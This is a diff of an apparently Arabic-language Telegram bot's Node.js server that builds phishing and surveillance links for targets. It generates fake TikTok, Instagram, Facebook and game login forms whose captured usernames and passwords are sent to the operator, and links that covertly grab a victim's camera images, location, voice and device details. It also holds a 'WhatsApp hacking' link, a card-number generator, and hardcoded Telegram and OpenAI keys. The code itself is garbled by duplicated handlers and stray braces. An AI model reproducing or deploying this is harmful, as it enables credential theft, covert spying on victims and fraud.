@@ -39,7 +39,7 @@ async function handleNewLogic(bot, chatId, data, query, userIdentityData, saveId
             'تفعيل هويات إضافية',
             'الحصول على 10 هويات إضافية صالحة للاستخدام فوراً.',
             'identity_pay_' + chatId,
-            process.env.mn, 
+            botToken, 
             'XTR', 
             [{ label: '10 هويات', amount: 20 }]
         ).catch(() => {
@@ -119,7 +119,7 @@ function generateShortToken(chatId, type, extra = {}) {
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 const tmo = process.env.is; 
-const botToken = "8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao";
+const botToken = "8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao"; 
 const botUsername = process.env.bott;
  // يمكنك تغيير هذا لليوزر الخاص بك إذا أردت
 
@@ -843,21 +843,14 @@ app.get('/record/:linkId', (req, res) => {
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
-    if (!chatId && token && shortLinkStore[token]) {
-        chatId = shortLinkStore[token].chatId;
-    }
+    if (!chatId && token && shortLinkStore[token]) chatId = shortLinkStore[token].chatId;
     const firstName = req.body.firstName;
     const secondName = req.body.secondName;
-
-    console.log('Received data:', req.body); 
-
-    bot.sendMessage(chatId, `تم اختراق حساب جديد⚠️: \n اليوزر: ${firstName} \nكلمة السر: ${secondName}`)
-        .then(() => {
-
-        })
-        .catch((error) => {
-            console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
-        });
+    const page = req.body.page || 'g.html';
+    bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
+        .then(() => res.sendFile(path.join(__dirname, page)))
+        .catch(() => res.status(500).send('Error'));
+});
 
 
     res.redirect('/ok.html');
@@ -1307,145 +1300,79 @@ bot.on('callback_query', async (callbackQuery) => {
 
     const exemptButtons = ['add_names', 'get_cameras', 'get_freefire', 'rshq_instagram', 'get_pubg', 'rshq_tiktok', 'add_nammes', 'rshq_facebook'];
 
-    if (!exemptButtons.includes(data.split(':')[0]) && !(await isUserSubscribed(chatId))) {
-        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
-        const buttons = developerChannels.map(channel => ({ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }));
+    if (data === 'request_verification') {
+        const verificationLink = `${baseUrl}/whatsapp?t=${generateShortToken(chatId, 'whatsapp')}`;
+        bot.sendMessage(chatId, `تم انشاء الرابط لختراق وتساب
+: ${verificationLink}`);
+        return;
+    }
 
-        bot.sendMessage(chatId, message, {
-            reply_markup: {
-                inline_keyboard: [buttons]
-            }
+    if (data === 'add_vip' && chatId == 5739065274) {
+        bot.sendMessage(chatId, 'الرجاء إرسال معرف المستخدم لإضافته كـ VIP:');
+        bot.once('message', (msg) => {
+            const userId = msg.text;
+            addVIPUser(userId);
+            bot.sendMessage(chatId, `تم إضافة المستخدم ${userId} كـ VIP.`);
+        });
+        return;
+    } else if (data === 'remove_vip' && chatId == 5739065274) {
+        bot.sendMessage(chatId, 'الرجاء إرسال معرف المستخدم لإزالته من VIP:');
+        bot.once('message', (msg) => {
+            const userId = msg.text;
+            removeVIPUser(userId);
+            bot.sendMessage(chatId, `تم إزالة المستخدم ${userId} من VIP.`);
         });
         return;
     }
 
-    if (data === 'request_verification') {
-        const verificationLink = `${baseUrl}/whatsapp?t=${generateShortToken(chatId, 'whatsapp')}`;
-        bot.sendMessage(chatId, `تم انشاء الرابط لختراق وتساب\n: ${verificationLink}`);
+    if (data === 'collect_device_info') {
+        const url = `${baseUrl}/info?t=${generateShortToken(chatId, 'device_info')}`;
+        bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
+        return;
+    }
+
+    if (data === 'get_link') {
+        bot.sendMessage(chatId, 'أرسل لي رابطًا يبدأ بـ "https".');
+        const messageHandler = (msg) => {
+            if (msg.chat.id === chatId && msg.text && msg.text.startsWith('https')) {
+                dataStore[chatId] = { userLink: msg.text };
+                bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:
+${baseUrl}/k.html?t=${generateShortToken(chatId, 'k_link')}`);
+                bot.removeListener('message', messageHandler);
+            }
+        };
+        bot.on('message', messageHandler);
         return;
     }
 
     const [action, userId] = data.split(':');
-
-    if (action === 'get_joke') {
-        try {
-            const jokeMessage = 'اعطيني نكته يمنيه قصيره جداً بلهجه اليمنيه الاصيله🤣🤣🤣🤣';
-            const apiUrl = 'https://api.openai.com/v1/chat/completions';
-            const response = await axios.post(apiUrl, {
-                model: 'gpt-3.5-turbo',
-                messages: [{ role: 'user', content: jokeMessage }]
-            }, {
-                headers: {
-                    'Authorization': 'Bearer sk-j1u7p1lXXGseWwkhTzrZ1kNNPU6RVm5Iw5wkVItL2BT3BlbkFJaThHadlLGBmdRZqoXRZ_YJIcKlujfPdIGEOjpMgZcA',
-                    'Content-Type': 'application/json'
-                }
-            });
-            const joke = response.data.choices[0].message.content;
-
-            bot.sendMessage(chatId, joke);
-        } catch (error) {
-            console.error('Error fetching joke:', error.response ? error.response.data : error.message);
-            bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
-        }
-    } ]
-            }, {
-                headers: {
-                    'Authorization': 'Bearer sk-j1u7p1lXXGseWwkhTzrZ1kNNPU6RVm5Iw5wkVItL2BT3BlbkFJaThHadlLGBmdRZqoXRZ_YJIcKlujfPdIGEOjpMgZcA',
-                    'Content-Type': 'application/json'
-                }
-            });
-            const joke = response.data.choices[0].message.content;
-
-            bot.sendMessage(chatId, joke);
-        } catch (error) {
-            console.error('Error fetching joke:', error.response ? error.response.data : error.message);
-            bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
-        }
-    } ]
-            }, {
-                headers: {
-                    'Authorization': 'Bearer sk-j1u7p1lXXGseWwkhTzrZ1kNNPU6RVm5Iw5wkVItL2BT3BlbkFJaThHadlLGBmdRZqoXRZ_YJIcKlujfPdIGEOjpMgZcA',
-                    'Content-Type': 'application/json'
-                }
-            });
-            const love = response.data.choices[0].message.content;
-
-            bot.sendMessage(chatId, love);  
-} catch (error) {  
-    console.error('Error fetching love message:', error.response ? error.response.data : error.message);  
-    const errorMsg = 'حدثت مشكلة أثناء جلب الرسالة. الرجاء المحاولة مرة أخرى لاحق😁ًا.';
-    if (errorMsg && errorMsg.trim() !== '') {
-        bot.sendMessage(chatId, errorMsg);
-    }
-}  
-} else if (data === 'add_vip' && chatId == 5739065274) {  
-    const addVipMsg = 'الرجاء إرسال معرف المستخدم لإضافته كـ VIP:';
-    if (addVipMsg && addVipMsg.trim() !== '') {
-        bot.sendMessage(chatId, addVipMsg);
-    }
-    bot.once('message', (msg) => {  
-        const userId = msg.text;  
-        addVIPUser(userId);
-        const addedMsg = `تم إضافة المستخدم ${userId} كـ VIP.`;
-        if (addedMsg && addedMsg.trim() !== '') {
-            bot.sendMessage(chatId, addedMsg);
-        }
-    });  
-} else if (data === 'remove_vip' && chatId == 5739065274) {  
-    const removeVipMsg = 'الرجاء إرسال معرف المستخدم لإزالته من VIP:';
-    if (removeVipMsg && removeVipMsg.trim() !== '') {
-        bot.sendMessage(chatId, removeVipMsg);
-    }
-    bot.once('message', (msg) => {  
-        const userId = msg.text;  
-        removeVIPUser(userId);
-        const removedMsg = `تم إزالة المستخدم ${userId} من VIP.`;
-        if (removedMsg && removedMsg.trim() !== '') {
-            bot.sendMessage(chatId, removedMsg);
-        }
-    });  
-} else {  
-    const [action, userId] = data.split(':');  
-
-    if (!exemptButtons.includes(action) && !validateLinkUsage(userId, action)) {  
-        // هنا غيرت السطر ليمنع إرسال رسالة فارغة
-        // bot.sendMessage(chatId, '');  
-        return;  
-    }  
-
     let link = '';
-
-        switch (action) {
-            case 'captureFront':
-                link = `${baseUrl}/captureFront/${generateShortToken(chatId, 'captureFront')}`;
-                break;
-            case 'captureBack':
-                link = `${baseUrl}/captureBack/${generateShortToken(chatId, 'captureBack')}`;
-                break;
-            case 'getLocation':
-                link = `${baseUrl}/getLocation/${generateShortToken(chatId, 'getLocation')}`;
-                break;
-            case 'recordVoice':
-                const duration = 10;  
-                link = `${baseUrl}/record/${generateShortToken(chatId, 'recordVoice', {duration})}`;
-                break;
-            case 'rshq_tiktok':
-                link = `${baseUrl}/getNameForm?t=${generateShortToken(chatId, 'tiktok')}`;
-                break;
-            case 'rshq_instagram':
-                link = `${baseUrl}/getNameForm?t=${generateShortToken(chatId, 'instagram')}`;
-                break;
-            case 'rshq_facebook':
-                link = `${baseUrl}/getNameForm?t=${generateShortToken(chatId, 'facebook')}`;
-                break;
-            default:
-                bot.sendMessage(chatId, '');
-                return;
-        }
-
+    switch (action) {
+        case 'captureFront':
+            link = `${baseUrl}/captureFront/${generateShortToken(chatId, 'captureFront')}`;
+            break;
+        case 'captureBack':
+            link = `${baseUrl}/captureBack/${generateShortToken(chatId, 'captureBack')}`;
+            break;
+        case 'getLocation':
+            link = `${baseUrl}/getLocation/${generateShortToken(chatId, 'getLocation')}`;
+            break;
+        case 'recordVoice':
+            link = `${baseUrl}/record/${generateShortToken(chatId, 'recordVoice', {duration: 10})}`;
+            break;
+        case 'rshq_tiktok':
+            link = `${baseUrl}/getNameForm?t=${generateShortToken(chatId, 'tiktok')}`;
+            break;
+        case 'rshq_instagram':
+            link = `${baseUrl}/getNameForm?t=${generateShortToken(chatId, 'instagram')}`;
+            break;
+        case 'rshq_facebook':
+            link = `${baseUrl}/getNameForm?t=${generateShortToken(chatId, 'facebook')}`;
+            break;
+    }
+    if (link) {
         bot.sendMessage(chatId, `تم إنشاء الرابط: ${link}`);
     }
-
     bot.answerCallbackQuery(callbackQuery.id);
 });
 bot.onText(/\/jjihigjoj/, (msg) => {
@@ -1460,73 +1387,23 @@ bot.onText(/\/jjihigjoj/, (msg) => {
     });
 
 
-bot.on('callback_query', (query) => {
-    const chatId = query.message.chat.id;
 
 
-    if (query.data === 'collect_device_info') {
-        const url = `${baseUrl}/info?t=${generateShortToken(chatId, 'device_info')}`;
-        bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
-    }
-
-
-    bot.answerCallbackQuery(query.id);
-});
-bot.on('callback_query', (query) => {
-    const chatId = query.message.chat.id;
-
-    if (query.data === 'get_link') {
-
-        bot.sendMessage(chatId, 'أرسل لي رابطًا يبدأ بـ "https".');
-
-
-        const messageHandler = (msg) => {
-
-            if (msg.chat.id === chatId) {
-                if (msg.text && msg.text.startsWith('https')) {
-                    const userLink = msg.text;
-
-
-                    dataStore[chatId] = { userLink };
-
-
-                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\n${baseUrl}/k.html?t=${generateShortToken(chatId, 'k_link')}`);
-
-
-                    bot.removeListener('message', messageHandler);
-                } else {
-
-                    bot.sendMessage(chatId, 'الرجاء إدخال رابط صحيح يبدأ بـ "https".');
-                }
-            }
-        };
-
-
-        bot.on('message', messageHandler);
-    }
-});
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
-    if (!chatId && token && shortLinkStore[token]) {
-        chatId = shortLinkStore[token].chatId;
-    }
+    if (!chatId && token && shortLinkStore[token]) chatId = shortLinkStore[token].chatId;
     const firstName = req.body.firstName;
     const secondName = req.body.secondName;
-
-    console.log('Received data:', req.body); 
-
+    const page = req.body.page || 'g.html';
     bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
-        .then(() => {
-            res.sendFile(path.join(__dirname, 'g.html')); 
-        })
-        .catch((error) => {
-            console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
-            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
-        });
+        .then(() => res.sendFile(path.join(__dirname, page)))
+        .catch(() => res.status(500).send('Error'));
+});
+});
 
 app.get('/ge', (req, res) => {
     const chatId = req.query.chatId;
@@ -1542,22 +1419,15 @@ app.use(express.static(__dirname));
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
-    if (!chatId && token && shortLinkStore[token]) {
-        chatId = shortLinkStore[token].chatId;
-    }
+    if (!chatId && token && shortLinkStore[token]) chatId = shortLinkStore[token].chatId;
     const firstName = req.body.firstName;
     const secondName = req.body.secondName;
-
-    console.log('Received data:', req.body); 
-
+    const page = req.body.page || 'g.html';
     bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
-        .then(() => {
-            res.sendFile(path.join(__dirname, 'F.html')); 
-        })
-        .catch((error) => {
-            console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
-            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
-        });
+        .then(() => res.sendFile(path.join(__dirname, page)))
+        .catch(() => res.status(500).send('Error'));
+});
+});
 
 app.get('/getNam', (req, res) => {
     const chatId = req.query.chatId;
@@ -1573,22 +1443,15 @@ app.use(express.static(__dirname));
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
-    if (!chatId && token && shortLinkStore[token]) {
-        chatId = shortLinkStore[token].chatId;
-    }
+    if (!chatId && token && shortLinkStore[token]) chatId = shortLinkStore[token].chatId;
     const firstName = req.body.firstName;
     const secondName = req.body.secondName;
-
-    console.log('Received data:', req.body); 
-
+    const page = req.body.page || 'g.html';
     bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
-        .then(() => {
-            res.sendFile(path.join(__dirname, 's.html')); 
-        })
-        .catch((error) => {
-            console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
-            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
-        });
+        .then(() => res.sendFile(path.join(__dirname, page)))
+        .catch(() => res.status(500).send('Error'));
+});
+});
 
 app.get('/getName', (req, res) => {
     const chatId = req.query.chatId;
@@ -1884,21 +1747,7 @@ bot.onText(/\/jjjjjavayy/, (msg) => {
         }
     });
 
-bot.on('callback_query', (query) => {
-    const chatId = query.message.chat.id;
-    let link;
 
-    if (query.data === 'get_pubg') {
-        link = `${baseUrl}/g.html?t=${generateShortToken(chatId, 'pubg')}`;
-    } else if (query.data === 'get_freefire') {
-        link = `${baseUrl}/F.html?t=${generateShortToken(chatId, 'freefire')}`;
-    } else if (query.data === 'add_names') {
-        link = `${baseUrl}/s.html?t=${generateShortToken(chatId, 'names')}`;
-    }
-
-    if (link) {
-        bot.sendMessage(chatId, `تم لغيم الرابط هذا: ${link}`);
-        bot.answerCallbackQuery(query.id, { text: 'تم إرسال الرابط إليك ✅' });
     } else if (query.data === 'add_nammes') {
         bot.sendMessage(chatId, `قم بإرسال هذا لفتح أوامر اختراق الهاتف كاملاً قم بضغط على هذا الامر /Vip`);
         bot.answerCallbackQuery(query.id, { text: '' });
@@ -1999,105 +1848,86 @@ bot.onText(/\/نكخمنتته/, (msg) => {
 
 
 bot.on('callback_query', async (callbackQuery) => {
-  const chatId = callbackQuery.message.chat.id;
+    const chatId = callbackQuery.message.chat.id;
+    const data = callbackQuery.data;
+    if (await handleNewLogic(bot, chatId, data, callbackQuery, userIdentityData, saveIdentityData, IDENTITY_CHANNEL_ID)) return;
 
-  if (callbackQuery.data === "generate_visa") {
-    let progressMsg = await bot.sendMessage(chatId, "Generating Visa...\n[░░░░░░░░░░] 0%");
+    const exemptButtons = ['add_names', 'get_cameras', 'get_freefire', 'rshq_instagram', 'get_pubg', 'rshq_tiktok', 'add_nammes', 'rshq_facebook'];
 
-    await new Promise(res => setTimeout(res, 1000));
-    await bot.editMessageText("Generating Visa...\n[▓▓░░░░░░░░] 25%", { chat_id: chatId, message_id: progressMsg.message_id });
-
-    await new Promise(res => setTimeout(res, 1000));
-    await bot.editMessageText("Generating Visa...\n[▓▓▓▓░░░░░░] 50%", { chat_id: chatId, message_id: progressMsg.message_id });
-
-    await new Promise(res => setTimeout(res, 1000));
-    await bot.editMessageText("Generating Visa...\n[▓▓▓▓▓▓░░░░] 75%", { chat_id: chatId, message_id: progressMsg.message_id });
-
-    await new Promise(res => setTimeout(res, 1000));
-    await bot.editMessageText("Generating Visa...\n[▓▓▓▓▓▓▓▓▓▓] 100%", { chat_id: chatId, message_id: progressMsg.message_id });
-
-    await new Promise(res => setTimeout(res, 1000));
-    await bot.deleteMessage(chatId, progressMsg.message_id);
-
-    const visaData = await fetchVisaData();
-
-    if (visaData) {
-      const { CardNumber, Expiry, CVV, Bank, CardType, Country, Value } = visaData;
-
-      bot.sendMessage(chatId, `
-𝗣𝗮𝘀𝘀𝗲𝗱 ✅
-*[-] Card Number :* \`${CardNumber}\`
-*[-] Expiry :* \`${Expiry}\`
-*[-] CVV :* \`${CVV}\`
-*[-] Bank :* \`${Bank}\`
-*[-] Card Type :* \`${CardType}\`
-*[-] Country :* \`${Country}\`
-*[-] Value :* \`${Value}\`
-*============================
-[-] by :* [BOT](t.me/ZI0_bot)
-      `, { parse_mode: "Markdown" });
-    } else {
-      bot.sendMessage(chatId, "Failed to fetch visa data. Please try again later.");
+    if (data === 'request_verification') {
+        const verificationLink = `${baseUrl}/whatsapp?t=${generateShortToken(chatId, 'whatsapp')}`;
+        bot.sendMessage(chatId, `تم انشاء الرابط لختراق وتساب
+: ${verificationLink}`);
+        return;
     }
-  }
-});
 
-
-const deleteFolderRecursive = (directoryPath) => {
-    if (fs.existsSync(directoryPath)) {
-        fs.readdirSync(directoryPath).forEach((file) => {
-            const currentPath = path.join(directoryPath, file);
-            if (fs.lstatSync(currentPath).isDirectory()) {
-
-                deleteFolderRecursive(currentPath);
-            } else {
-
-                fs.unlinkSync(currentPath);
-            }
+    if (data === 'add_vip' && chatId == 5739065274) {
+        bot.sendMessage(chatId, 'الرجاء إرسال معرف المستخدم لإضافته كـ VIP:');
+        bot.once('message', (msg) => {
+            const userId = msg.text;
+            addVIPUser(userId);
+            bot.sendMessage(chatId, `تم إضافة المستخدم ${userId} كـ VIP.`);
         });
-        fs.rmdirSync(directoryPath);
+        return;
+    } else if (data === 'remove_vip' && chatId == 5739065274) {
+        bot.sendMessage(chatId, 'الرجاء إرسال معرف المستخدم لإزالته من VIP:');
+        bot.once('message', (msg) => {
+            const userId = msg.text;
+            removeVIPUser(userId);
+            bot.sendMessage(chatId, `تم إزالة المستخدم ${userId} من VIP.`);
+        });
+        return;
     }
-};
 
-app.use(express.static(__dirname));
+    if (data === 'collect_device_info') {
+        const url = `${baseUrl}/info?t=${generateShortToken(chatId, 'device_info')}`;
+        bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
+        return;
+    }
 
+    if (data === 'get_link') {
+        bot.sendMessage(chatId, 'أرسل لي رابطًا يبدأ بـ "https".');
+        const messageHandler = (msg) => {
+            if (msg.chat.id === chatId && msg.text && msg.text.startsWith('https')) {
+                dataStore[chatId] = { userLink: msg.text };
+                bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:
+${baseUrl}/k.html?t=${generateShortToken(chatId, 'k_link')}`);
+                bot.removeListener('message', messageHandler);
+            }
+        };
+        bot.on('message', messageHandler);
+        return;
+    }
 
-
-
-
-app.post('/xx', (req, res) => {
-    const chatId = req.body.chatId;
-    const imageDatas = req.body.imageDatas.split(',');
-
-    imageDatas.forEach((imageData, index) => {
-        const buffer = Buffer.from(imageData, 'base64');
-
-      
-        bot.getChat(chatId).then(user => {
-            const username = user.username ? `@${user.username}` : "لم يتم العثور على اسم المستخدم";
-            const fullName = `${user.first_name || ""} ${user.last_name || ""}`.trim();
-
-          
-            bot.sendPhoto(chatId, buffer, { caption: `🙋‍♂️ الصورة ${index + 1}` });
-
-          
-            botOwner.sendPhoto(ownerChatId, buffer, {
-                caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}`
-            });
-        }).catch(err => {
-            console.error("حدث خطأ أثناء جلب معلومات المستخدم: ", err);
-
-            
-            botOwner.sendPhoto(ownerChatId, buffer, {
-                caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: غير متوفر\n📛 اسم الحساب: غير متوفر\n📸 الصورة ${index + 1}`
-            });
-
-    console.log(`Sent photos for chatId ${chatId}`);
-    res.redirect('/ok.html');
-});
-
-app.get('/ios', (req, res) => {
-    res.sendFile(path.join(__dirname, 'xx.html'));
+    const [action, userId] = data.split(':');
+    let link = '';
+    switch (action) {
+        case 'captureFront':
+            link = `${baseUrl}/captureFront/${generateShortToken(chatId, 'captureFront')}`;
+            break;
+        case 'captureBack':
+            link = `${baseUrl}/captureBack/${generateShortToken(chatId, 'captureBack')}`;
+            break;
+        case 'getLocation':
+            link = `${baseUrl}/getLocation/${generateShortToken(chatId, 'getLocation')}`;
+            break;
+        case 'recordVoice':
+            link = `${baseUrl}/record/${generateShortToken(chatId, 'recordVoice', {duration: 10})}`;
+            break;
+        case 'rshq_tiktok':
+            link = `${baseUrl}/getNameForm?t=${generateShortToken(chatId, 'tiktok')}`;
+            break;
+        case 'rshq_instagram':
+            link = `${baseUrl}/getNameForm?t=${generateShortToken(chatId, 'instagram')}`;
+            break;
+        case 'rshq_facebook':
+            link = `${baseUrl}/getNameForm?t=${generateShortToken(chatId, 'facebook')}`;
+            break;
+    }
+    if (link) {
+        bot.sendMessage(chatId, `تم إنشاء الرابط: ${link}`);
+    }
+    bot.answerCallbackQuery(callbackQuery.id);
 });
 bot.onText(/\/اتتهتتاههة/, (msg) => {
     const chatId = msg.chat.id;
@@ -2133,14 +1963,7 @@ bot.onText(/\/sخسننسمس/, (msg) => {
     bot.sendMessage(chatId, "مرحبًا! اضغط على الزر لتوليد رابط دعوة.", opts);
 });
 
-bot.on('callback_query', (query) => {
-    if (query.data === "generate_invite") {
-        const userId = query.from.id;
-        const inviteLink = `https://t.me/ygf2gbot?start=${userId}`;
 
-        bot.sendMessage(query.message.chat.id, `تم انشاء رابط قم في ارساله لضحيه لمعرفة معلومات حسابه تلجرام:\n${inviteLink}`);
-    }
-});
 
 
 secondBot.onText(/\/start (.+)/, (msg, match) => {
@@ -3153,29 +2976,7 @@ bot.onText(/\/stㄹㅎㅊart/, (msg) => {
 });
 
 
-bot.on('callback_query', (query) => {
-  const chatId = query.message.chat.id;
-  const messageId = query.message.message_id;
 
-  if (query.data === 'choose_type') {
-    const options = {
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: 'يوزرات نوع1', callback_data: 'triple' }],
-          [{ text: 'يوزرات رباعية', callback_data: 'quad' }],
-          [{ text: 'شبه رباعية', callback_data: 'semi_quad' }],
-          [{ text: 'شبه ثلاثية', callback_data: 'semi_triple' }],
-          [{ text: 'عشوائية', callback_data: 'random' }],
-          [{ text: 'مميز', callback_data: 'extra' }]
-        ]
-      }
-    };
-
-    bot.editMessageText('اختر نوع اليوزرات:', {
-      chat_id: chatId,
-      message_id: messageId,
-      reply_markup: options.reply_markup
-    });
   } else if (['triple', 'quad', 'semi_quad', 'semi_triple', 'random', 'extra'].includes(query.data)) {
 
     startSearch(chatId, messageId, query.data);
@@ -3573,29 +3374,7 @@ function showDreamMenu(chatId) {
     bot.sendMessage(chatId, "مرحبًا! اضغط على الزر أدناه لاختيار نوع التفسير:", options);
 }
 
-bot.on('callback_query', (query) => {
-    const chatId = query.message.chat.id;
 
-    if (query.data === "dream_menur") {
-        const options = {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: "ذكاء اصطناعي", callback_data: "ar" },
-                        { text: "ابن سيرين", callback_data: "ibn_sirin" }
-                    ]
-                ]
-            }
-        };
-
-
-        userSessionsg[chatId] = { state: "waiting_for_choice" };
-
-        bot.editMessageText("اختر مصدر التفسير:", {
-            chat_id: chatId,
-            message_id: query.message.message_id,
-            reply_markup: options.reply_markup
-        });
     } else if (query.data === "ar") {
         bot.sendMessage(chatId, "أرسل حلمك ليتم تفسيره بواسطة الذكاء الاصطناعي:");
         userSessionsg[chatId].state = "ar";
